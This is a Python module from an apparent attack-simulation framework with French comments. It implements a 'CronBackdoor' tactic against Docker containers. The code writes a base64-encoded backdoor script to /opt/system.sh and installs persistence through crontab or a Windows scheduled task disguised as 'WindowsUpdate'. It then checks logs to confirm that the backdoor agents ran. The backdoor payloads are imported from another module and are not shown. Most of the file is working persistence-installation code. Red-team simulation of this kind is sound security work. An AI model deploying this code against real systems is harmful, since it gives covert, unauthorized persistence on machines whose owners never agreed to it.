#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Apr 23 07:56:27 2026

@author: hounsousamuel
"""

import os
import sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", "..", ".."))))
import time
import json
import pprint
import base64
import threading
import subprocess
from simulateur_attaque_ia.core.docker_manager import DockerManager
from simulateur_attaque_ia.tactics.base import Base
from simulateur_attaque_ia.tactics.mittres import MITRE
from simulateur_attaque_ia.simulateur_utils.logger import get_logger
from simulateur_attaque_ia.tactics.persistence.data.backdoor_helper import SILENT, SIMPLE, INTER, get_backdoor_script

logger = get_logger()

class CronBackdoor(Base):
    def __init__(
        self, 
        name:str = "cron_backdoor",
        timeout:int = 2, delay:int = 0.5, 
        max_attempts:int = 50, 
        total_timeout:float|None = None,
        **kwargs
    ):
        self.name = name
        super().__init__(name=self.name, **kwargs)
        self.start_time = time.time()
        self.results = {}
        self.docker_manager = None
    
    def start_cron_service(self, docker_manager:DockerManager) -> bool:
        self.log("Démarrage ou vérification du service cron", log=True)
        directory_to_create = [
            "/etc",
            "/var",
            "/run",
            "/var/run",
            "/var/spool",
            "/var/spool/cron",
            "/var/spool/cron/crontabs",
            "/var/log/cron",
            "/var/log",
            "/etc/crontab",
            "/etc/anacrontab"
        ]
        file_to_create = [
            "/etc/cron.d",
            "/etc/cron.hourly",
            "/etc/cron.daily",
            "/var/run/crond.pid",
            "/var/run/cron.pid",
            "/run/crond.pid",
            "/run/cron.pid"
        ]

        for directory in directory_to_create:
            cmd = f"mkdir -p {directory}"
            self.log(f"Exécution de la commande : {cmd}", log=True)
            _, _ = docker_manager.exec_command(cmd)
        
        for file in file_to_create:
            cmd = f"touch {file}"
            self.log(f"Exécution de la commande : {cmd}", log=True)
            _, _ = docker_manager.exec_command(cmd)
        
        stdout, result = docker_manager.exec_command("bash -c 'cron -f &'")
        stdout_, result_ = docker_manager.exec_command("bash -c 'crond -f &'")
        result_exit_code = result_.exit_code in (0, 1) or result.exit_code in (0, 1)
        check_stdout, check_result = docker_manager.exec_command("pgrep -f cron")
        # print(check_stdout)
        if result_exit_code and check_result.exit_code in (0, 1):
            try:
                if check_stdout.strip() or 1:
                    self.log("✅ Service cron démarré (ou déjà en cours)")
                    return True
            except ValueError:
                self.log("❌ Impossible de démarrer cron")
        
        self.log("❌ Impossible de démarrer cron")
        return False
                
    def create_backdoor_script(self, docker_manager:DockerManager, content:str, script_path:str='/opt/system.sh') -> bool:
        script_dir = os.path.dirname(script_path)
        docker_manager.exec_command(f"mkdir -p {script_dir}")
        docker_manager.exec_command(f"touch {script_path}")
        encoded = base64.b64encode(content.encode()).decode()
        write_stdout, write_result = docker_manager.exec_command(
            f"""bash -c "echo '{encoded}' | base64 -d - >  {script_path}" """
        )
        read_stdout, read_result = docker_manager.exec_command(f"cat {script_path}")
        if read_stdout and read_result.exit_code == write_result.exit_code == 0:
            _, chmod_result = docker_manager.exec_command(f"chmod 555 {script_path}")
            if chmod_result.exit_code == 0:
                return True
            return False
        return False
    
    def detect_os(self, docker_manager:DockerManager) -> str:
        """Détecte l'OS du container (Linux, Windows, Mac)"""
        result = docker_manager.exec_command('uname')
        os_name = result[0].strip().lower() if result[0] else "unknown"

        if "linux" in os_name:
            return "linux"
        elif "darwin" in os_name:
            return "macos"
        elif "windows" in os_name or "cygwin" in os_name:
            return "windows"
        else:
            return "unknown"
    
    
    def inject_cron_entry_windows(self, docker_manager, script_path, task_name, interval_minutes=5) -> dict:
        """Injecte persistence via Task Scheduler Windows"""
        try:
            task_name = task_name or "WindowsUpdate"

            cmd = f"""schtasks /create /tn "{task_name}" /tr "{script_path}" /sc minute /mo {interval_minutes} /f"""

            cmd_output, cmd_result = docker_manager.exec_command(cmd)

            if cmd_result.exit_code == 0:
                self.log(f"Task Scheduler créée: {task_name}", log=True)

                verify_cmd = f"schtasks /query /tn '{task_name}'"
                verify_result = docker_manager.exec_command(verify_cmd)

                if verify_result[1].exit_code == 0:
                    return {
                        "success": True,
                        "task_name": task_name,
                        "interval": interval_minutes,
                        "command": script_path,
                        "explain": ""
                    }

            return {
                "success": False,
                "explain": f"Erreur création tâche: {cmd_result.exit_code}",
                "task_name": "",
                "interval": interval_minutes
            }

        except Exception as e:
            self.log(f"Erreur injection Windows: {e}", log=True)
            return {
                "success": False,
                "explain": str(e),
                "task_name": "",
                "interval": interval_minutes
            }
    
    def inject_cron_entry_linux(self, docker_manager:DockerManager, script_path:str, cron_expression:str = "*/5 * * * *", cmd:str = "/bin/bash") -> dict:
        """Injecte persistence via CRON Linux (existant)"""
        try:
            current_crontab_stdout, current_crontab_result = docker_manager.exec_command("crontab -l")
            cat_stdout, cat_result = docker_manager.exec_command(f'cat {script_path}')
            if cat_result.exit_code != 0 or not cat_stdout:
                return {
                    "success": False,
                    'explain': f"Fichier vide ! Code: {cat_result.exit_code}",
                    "current_crontab": "",
                    "all_crontab": "",
                }
            
            if current_crontab_result.exit_code not in (0, 1):
                self.log(f"Erreur crontab: {current_crontab_result.exit_code}", log=True)
                return {
                    "success": False,
                    'explain': f"error, returncode {current_crontab_result.exit_code}",
                    "current_crontab": "",
                    "all_crontab": "",
                }
            
            which_stdout, _ = docker_manager.exec_command('which crontab')

            if not which_stdout:
                which_stdout_, which_result_ = docker_manager.exec_command('lsb_release -a')
                if any(c in which_stdout_.lower() for c in ('ubuntu', 'debian')):
                    docker_manager.exec_command("apt install -y cron")
                    
                elif any(c in which_stdout_.lower() for c in ('centos', 'rhel')):
                    docker_manager.exec_command("yum install -y cron")
                    
                elif 'fedora' in which_stdout_.lower():
                    docker_manager.exec_command("dnf install -y cron")
                
                elif 'arch' in which_stdout_.lower():
                    docker_manager.exec_command("pacman -S --noconfirm  cron")
                
                elif 'darwin' in which_stdout_.lower():
                    docker_manager.exec_command("brew install -y cron")
                
                else:
                    return {
                        "success": False,
                        'explain': f"error can't install cron {which_result_.exit_code}",
                        "current_crontab": "",
                        "all_crontab": "",
                    }
                
            cron_entry = f"{cron_expression} {cmd} {script_path} 2>&1"
            if cron_entry in current_crontab_stdout:
                self.log("Cron existante déja", log=True)
                return {
                    "success": True,
                    "current_crontab": cron_entry,
                    "all_crontab": current_crontab_stdout,
                    "explain": ""
                }
            
            if current_crontab_result.exit_code == 1 or "no crontab" in str(current_crontab_stdout) or str(current_crontab_stdout) == "":
                self.log("Création nouvelle crontab", log=True)
                cron_cmd = f"""bash -c "echo '{cron_entry}' | crontab -" """
            else:
                self.log('Ajout à crontab existante', log=True)
                cron_cmd = f"""bash -c "(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -" """
            
            cron_cmd_stdout, cron_cmd_result = docker_manager.exec_command(cron_cmd)
            cron_list, _ = docker_manager.exec_command('crontab -l')
            
            if cron_entry.strip() in cron_list:
                self.log(f"Crontab injectée: {cron_entry}", log=True)
                return {
                    "success": True,
                    "current_crontab": cron_entry,
                    "all_crontab": cron_list,
                    "explain": ""
                }

            return {
                "success": False,
                'explain': "Crontab non vérifiée",
                "current_crontab": "",
                "all_crontab": cron_list,
            }
        
        except Exception as e:
            self.log(f"Erreur injection Linux: {str(e)}", log=True)
            return {
                "success": False,
                'explain': str(e),
                "current_crontab": "",
                "all_crontab": "",
            }
    
    def cron_inject(
        self, 
        docker_manager, 
        script_path='/opt/system.sh',
        cron_expression="*/5 * * * *", 
        content:str|None = None,
        level='simple',
        cmd:str = "/bin/bash"
   ):

        self.docker_manager = docker_manager
        self.start_time = time.time()
        self.method = "cron"

        target_os = self.detect_os(docker_manager)
        self.results["target_os"] = target_os
        self.results["method"] = "cron"
        self.log(f"OS cible détecté: {target_os}", log=True)
        if content:
            script = content
        else:
            script = get_backdoor_script(level=level)
            
        create = self.create_backdoor_script(
            docker_manager=docker_manager,
            script_path=script_path,
            content=script
        )
        self.results['create_success'] = create

        if create:
            if target_os == "windows":
                self.log("Utilisation Task Scheduler (Windows)", log=True)
                task_name = f"WindowsUpdate_{level}"
                inject = self.inject_cron_entry_windows(
                    docker_manager=docker_manager,
                    script_path=script_path,
                    task_name=task_name,
                    interval_minutes=5
                )
                self.results['inject'] = inject
                self.results["method"] = "schtasks"

            elif target_os == "macos":
                self.log("Utilisation launchd (macOS)", log=True)
                started = self.start_cron_service(self.docker_manager)
                if not started:
                    self.log('cron non demaré !', log=True)
                    return self.get_result()
                
                inject = self.inject_cron_entry_linux(
                    docker_manager=docker_manager,
                    script_path=script_path,
                    cron_expression=cron_expression,
                    cmd=cmd
                )
                self.results['inject'] = inject

            else:
                self.log("Utilisation CRON (Linux)", log=True)
                started = self.start_cron_service(self.docker_manager)
                if not started:
                    self.log('cron non demaré !', log=True)
                    return self.get_result()
                
                inject = self.inject_cron_entry_linux(
                    docker_manager,
                    script_path,
                    cron_expression,
                    cmd=cmd
                )
                self.results['inject'] = inject

            if self.results.get('inject', {}).get('success', False):
                self.log(f'✅ Persistence installée via {self.method}', log=True)
            else:
                logger.print('❌ Erreur installation persistence')
        else:
            self.log('❌ Erreur création script', log=True)

        self.end_time = time.time()
        self.log('Fin cron_inject()')
        return self.get_result()

    def monitor_execution(self, monitor_duration=130, log_files:list[str] = None):
        """Surveille l'exécution des scripts de backdoor via les logs"""
        
        self.log("🔍 Début surveillance centralisée", log=True)
        logger.print("🎯 SURVEILLANCE CENTRALISÉE /log/")
        logger.print(f"🔍 Surveillance pendant {monitor_duration} secondes...")
    
        if log_files is None:
            log_files = [
                "/log/cron_simple.log",
                "/log/agent_advanced.log",
                "/log/ghost_activity.log"
            ]
        
        executions = 0
        start_time = time.time()
        docker_manager = self.docker_manager
        
        # Création du répertoire de logs
        docker_manager.exec_command("mkdir -p /log")
        
        # AJOUT: Créer les fichiers de log s'ils n'existent pas
        for log_file in log_files:
            docker_manager.exec_command(f"touch {log_file}")
        
        # Patterns à rechercher pour chaque type d'agent
        detection_patterns = {
            "/log/cron_simple.log": [
                "SIMPLE_AGENT_STARTED",
                "SIMPLE_AGENT_COMPLETED",
                "SNAPSHOT_COMPLETED"
            ],
            "/log/agent_advanced.log": [
                "INTERMEDIATE_AGENT_STARTED",
                "INTERMEDIATE_AGENT_COMPLETED",
                "INTEL_COLLECTED"
            ],
            "/log/ghost_activity.log": [
                "GHOST_HEARTBEAT",
                "GHOST_AGENT_STARTED",
                "GHOST_AGENT_COMPLETED"
            ]
        }
        
        last_checked_lines = {log_file: 0 for log_file in log_files}
        
        # AJOUT: Forcer une première exécution immédiate des scripts
        logger.print("⚡ Exécution initiale des scripts pour test...")
        for script_path in ['/opt/system_simple.sh', '/opt/system_inter.sh', '/opt/system_silent.sh']:
            check_result = docker_manager.exec_command(f"test -f {script_path}")
            if check_result[1].exit_code == 0:
                docker_manager.exec_command(f"bash {script_path} &")
                logger.print(f"  ✓ Exécuté: {script_path}")
        
        logger.print("⏳ Attente des premières écritures dans les logs...")
        time.sleep(10)  # Attendre que les scripts écrivent
        
        while int(time.time() - start_time) <= monitor_duration:
            elapsed = int(time.time() - start_time)
    
            for log_file in log_files:
                # Lire les nouvelles lignes depuis la dernière vérification
                result = docker_manager.exec_command(f"bash -c 'tail -n +{last_checked_lines[log_file] + 1} {log_file} 2>/dev/null || echo \"\"' ")
                
                if result[0] and result[0].strip():
                    new_lines = result[0].strip().split('\n')
                    
                    for line in new_lines:
                        if line.strip():
                            # Vérifier si la ligne correspond à un pattern de détection
                            patterns = detection_patterns.get(log_file, [])
                            for pattern in patterns:
                                if pattern in line:
                                    executions += 1
                                    filename = os.path.basename(log_file)
                                    logger.print(f"✅ {filename}: {line.strip()}")
                                    self.log(f"Activité détectée dans {filename}: {pattern}")
                                    break
                    
                    # Mettre à jour le compteur de lignes
                    last_checked_lines[log_file] += len(new_lines)
            
            # Rapport périodique
            if elapsed % 30 == 0 and elapsed > 0:
                total_lines = 0
                total_size = 0
    
                for log_file in log_files:
                    # Compter le nombre total de lignes
                    lines_result = docker_manager.exec_command(f"""bash -c "wc -l < {log_file} 2>/dev/null || echo '0'" """)
                    size_result = docker_manager.exec_command(f"""bash -c "ls -l {log_file} 2>/dev/null | awk '{{print $5}}' || echo '0'" """)
    
                    try:
                        total_lines += int(lines_result[0].strip())
                        total_size += int(size_result[0].strip())
                    except (ValueError, TypeError):
                        pass
    
                logger.print(f"📊 {elapsed}s: {executions} activités détectées, Total: {total_lines} lignes, {total_size} bytes")
    
            time.sleep(5)  # Vérifier toutes les 5 secondes
    
        logger.print(f"🎯 SURVEILLANCE TERMINÉE: {executions} activités détectées")
        
        result = {
            'executions_detected': executions,
            'monitor_duration': monitor_duration,
            'success': executions > 0,
            'log_files_monitored': log_files,
            'detection_patterns': detection_patterns
        }
    
        return result

    def get_result(self):
        self.save()
        
        mitres = [MITRE.get("CronBackdoor", {})]
        results = {
            'severity': 'HIGH' if self.results.get('inject', {}).get('success', False) else "LOW",
            'elapsed': self.end_time - self.start_time,
            "mitres": mitres,
            'results':  {
                **self.results
            }
        }
        
        return results
    

def test_cron_backdoor(dock:DockerManager):
    """Fonction de test pour la backdoor cron"""
    cron = CronBackdoor()
    results = []
    
    # Test avec différents niveaux
    logger.print("\n🧪 TEST CRON BACKDOOR")
    logger.print("="*60)
    
    # Test 1: Niveau simple
    logger.print("\n1. Test niveau SIMPLE")
    results.append(cron.cron_inject(dock, '/opt/system_simple.sh', "*/1 * * * *", None, "simple"))
    
    # Test 2: Niveau intermédiaire
    logger.print("\n2. Test niveau INTERMEDIATE")
    results.append(cron.cron_inject(dock, '/opt/system_inter.sh', "*/2 * * * *", None, "intermediate"))
    
    # Test 3: Niveau avancé (silent)
    logger.print("\n3. Test niveau SILENT")
    results.append(cron.cron_inject(dock, '/opt/system_silent.sh', "*/3 * * * *", None, "silent"))
    
    # Afficher les résultats
    for i, r in enumerate(results, 1):
        logger.print(f"\n{'='*60}")
        logger.print(f"RÉSULTAT {i}:")
        logger.print(f"{'='*60}")
        try:
            logger.print(json.dumps(r, indent=2, ensure_ascii=False))
        except Exception:
            pprint.pprint(r, indent=2)
    
    # Lancer la surveillance
    logger.print("\n🔍 Lancement de la surveillance...")
    monitor_results = cron.monitor_execution(monitor_duration=180)
    
    logger.print("\n📊 Résultats de la surveillance:")
    logger.print(json.dumps(monitor_results, indent=2, ensure_ascii=False))
    
    return results, monitor_results
        